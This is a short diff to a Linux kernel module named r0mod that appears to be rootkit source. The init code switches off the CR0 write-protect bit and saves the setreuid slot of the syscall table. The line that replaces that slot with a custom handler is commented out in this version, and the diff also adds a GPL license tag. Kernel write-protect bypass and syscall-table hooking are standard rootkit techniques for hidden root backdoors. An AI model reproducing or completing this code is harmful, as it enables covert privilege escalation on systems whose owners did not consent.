@@ -180,9 +180,9 @@ static int __init r0mod_init(void)
 
     sys_found = 0;
 
-    write_cr0(read_cr0() && (~0x10000));
+    write_cr0(read_cr0() & (~ 0x10000));
     orig_setreuid = syscall_table[__NR_setreuid];
-    syscall_table[__NR_setreuid] = new_setreuid;
+    //syscall_table[__NR_setreuid] = new_setreuid;
     write_cr0(read_cr0() | 0x10000);
 
     kfree(buf);
@@ -203,5 +203,6 @@ static void __exit r0mod_exit(void)
     }
 }
 
+MODULE_LICENSE("GPL");
 module_init(r0mod_init);
 module_exit(r0mod_exit);
